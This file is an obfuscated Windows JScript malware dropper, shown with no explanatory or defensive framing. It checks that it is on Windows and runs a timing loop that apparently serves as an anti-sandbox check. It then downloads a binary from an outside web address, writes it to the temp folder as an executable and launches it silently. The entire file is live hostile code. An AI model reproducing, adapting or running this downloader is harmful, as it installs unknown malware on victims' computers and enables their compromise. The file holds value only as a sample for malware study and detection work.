var B0 = false;
var R = "CreateObject";
var xs = function s() {return WScript[R]("WScript.Shell");}(), D = 11;
var Wa = "MSXML2.XMLHTTP";
var Bw = 2123213;
var q = 0;
function J(j){xs["Run"](j, q, q);};
function e(){return "" + Wa;};
function A(Fy, Om){q = q * 1; return Fy - Om;};
function a(){return R;};
/*@cc_on
  @if (@_win32 || @_win64)
    B0 = true;
  @end
@*/
if (B0)
{
var oD = "";
function Ik(){return 22;};
var aq = 0; var in0 = 0;
function AN()
{
var B = new this["Date"]();
var uf = B["getUTCMilliseconds"]();
WScript["Sleep"](Ik());
var B = new this["Date"]();
var h = B["getUTCMilliseconds"]();
WScript["Sleep"](Ik());
var B = new this["Date"]();
var cm = B["getUTCMilliseconds"]();
var aq = "IE";
aq = A(h, uf);
var in0 = "mI";
in0 = A(cm, h);
oD = "open";
return A(aq, in0);
}
var h0 = false;
var x = false;
for (var xI = q; xI < Ik() * 1; xI++){if (AN() != q){
h0 = true; 
in0 = "31" + 11 * aq + in0; 
x = true; 
break;
}}
function U() {return ((h0 == true) && (h0 == x)) ? 1 : q;};
if (h0 && U() && x){
function Ki() {return xs["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "IN0711Z8vckSRI1.exe";};
 z = e();
 d = WScript[R](z);
 var V = 1;
 while (V){
try {
d[oD]("GET", "http://shippedmedicalsupplies.com/n5ids", false);
d["send"]();
E = "Sleep";
for (;;){WScript[E](Ik() * 11); if (d["readystate"] >= 2 * 2) break;};
V = q;
} catch(MQ){};
}
function Br(W) {var GG = (1, 2, 3, 4, 5, W); return GG;};
p = WScript[a()]("ADODB.Stream");
z = p;
z[oD]();
z["type"] = Br(1);
z["write"](d["ResponseBody"]);
p["position"] = Br(q);
z["Save" + "ToFile"](Ki(), 2);
p["c"+"lose"]();
Tx = Ki();
J(Tx);
}
}

